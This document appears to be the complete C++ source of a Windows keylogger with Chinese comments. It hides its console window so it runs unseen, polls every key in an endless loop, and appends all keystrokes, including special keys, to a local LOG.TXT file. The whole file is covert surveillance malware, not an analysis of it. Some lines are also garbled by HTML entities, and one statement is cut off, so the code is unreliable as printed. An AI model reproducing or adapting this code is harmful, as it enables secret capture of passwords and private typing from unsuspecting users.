#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <ctime>
#include <time.h>








using namespace std;
int Save(int key_stroke, char *file);
void Stealth();

int main()
{
 //讀出鍵盤狀態
 Stealth();
 char i;

 FILE *OUTPUT_FILE;
 OUTPUT_FILE = fopen("LOG.TXT", "a+");


 BYTE bKeys;
 
 //檢查按鍵是否開啟
 bKeys   =   GetKeyState(VK_NUMLOCK);
 if(bKeys)
 {
  fprintf(OUTPUT_FILE,"%s","[Num lock 開啟ing ]\n");
 }

 bKeys   =   GetKeyState(VK_CAPITAL);
 
 if(bKeys)
 {
  fprintf(OUTPUT_FILE,"%s","[Caps lock 開啟ing ]\n");
 }

 while (1)
 {
  time_t firstSeconds,lastSeconds;

  lastSeconds = time (NULL);

  for(i=8;i&lt;=190;i++)
  {
   firstSeconds = time (NULL);
   if(GetAsyncKeyState(i) == -32767)
    Save(i,"LOG.TXT");
  }

  //代表一陣子鍵盤沒有輸入任何字串
  if (lastSeconds-firstSeconds&gt;=10)
   fprintf(OUTPUT_FILE,"%s","\n\n");
 
 }
 system("PAUSE");
 return 0;
}
/* ********************************** */
/* ********************************** */
int Save(int key_stroke, char *file)
{



 if( (key_stroke==1) || (key_stroke==2) )
 return 0;

 FILE *OUTPUT_FILE;
 OUTPUT_FILE = fopen(file, "a+");
 cout&lt;
 int bKeys;
 bKeys   =   GetKeyState(VK_CAPITAL);


 //修改特殊按鍵問題
 if (key_stroke == 8)
  fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]" );
 else if (key_stroke == 13)
  fprintf(OUTPUT_FILE, "%s", "\n" );
 else if (key_stroke == 32)
  fprintf(OUTPUT_FILE, "%s", " " );
 else if (key_stroke == VK_TAB)
  fprintf(OUTPUT_FILE, "%s", "[TAB]" );
 else if (key_stroke == VK_SHIFT)
  fprintf(OUTPUT_FILE, "%s", "[SHIFT]" );
 else if (key_stroke == VK_CONTROL)
  fprintf(OUTPUT_FILE, "%s", "[CTRL]" );
 else if (key_stroke == VK_ESCAPE)
  fprintf(OUTPUT_FILE, "%s", "[ESC]" );
 else if (key_stroke == VK_END)
  fprintf(OUTPUT_FILE, "%s", "[END]" );
 else if (key_stroke == VK_HOME)
  fprintf(OUTPUT_FILE, "%s", "[HOME]" );
 else if (key_stroke == VK_LEFT)
  fprintf(OUTPUT_FILE, "%s", "[LEFT]" );
 else if (key_stroke == VK_RIGHT)
  fprintf(OUTPUT_FILE, "%s", "[RIGHT]" );
 else if (key_stroke == VK_UP)
  fprintf(OUTPUT_FILE, "%s", "[UP]" );
 else if (key_stroke == VK_DOWN)
  fprintf(OUTPUT_FILE, "%s", "[DOWN]" );
 else if (key_stroke==VK_CAPITAL)
  fprintf(OUTPUT_FILE, "%s", "[Caps Lock]" );
 else if (key_stroke==VK_NUMLOCK)
  fprintf(OUTPUT_FILE, "%s", "[Num Lock]" );

 //修改右側小鍵盤問題
 else if (key_stroke == VK_NUMPAD0)
  fprintf(OUTPUT_FILE, "%s", "0" );
 else if (key_stroke == VK_NUMPAD1)
  fprintf(OUTPUT_FILE, "%s", "1" );
 else if (key_stroke == VK_NUMPAD2)
  fprintf(OUTPUT_FILE, "%s", "2" );
 else if (key_stroke == VK_NUMPAD3)
  fprintf(OUTPUT_FILE, "%s", "3" );
 else if (key_stroke == VK_NUMPAD4)
  fprintf(OUTPUT_FILE, "%s", "4" );
 else if (key_stroke == VK_NUMPAD5)
  fprintf(OUTPUT_FILE, "%s", "5" );
 else if (key_stroke == VK_NUMPAD6)
  fprintf(OUTPUT_FILE, "%s", "6" );
 else if (key_stroke == VK_NUMPAD7)
  fprintf(OUTPUT_FILE, "%s", "7" );
 else if (key_stroke == VK_NUMPAD8)
  fprintf(OUTPUT_FILE, "%s", "8" );
 else if (key_stroke == VK_NUMPAD9)
  fprintf(OUTPUT_FILE, "%s", "9" );
 else if (key_stroke == 190 || key_stroke == 110)
  fprintf(OUTPUT_FILE, "%s", "." );


 //一般文字大小寫問題
 else if (bKeys==0 &amp;&amp; key_stroke&gt;=65)
 {
  key_stroke=key_stroke+32;
  fprintf(OUTPUT_FILE, "%s", &amp;key_stroke);
 }
 else
  fprintf(OUTPUT_FILE, "%s", &amp;key_stroke );
 
 fclose(OUTPUT_FILE);
 return 0;
}

/* ********************************** */
/* ********************************** */
void Stealth()
{
 HWND stealth;
 AllocConsole();
 stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(stealth,0);
}
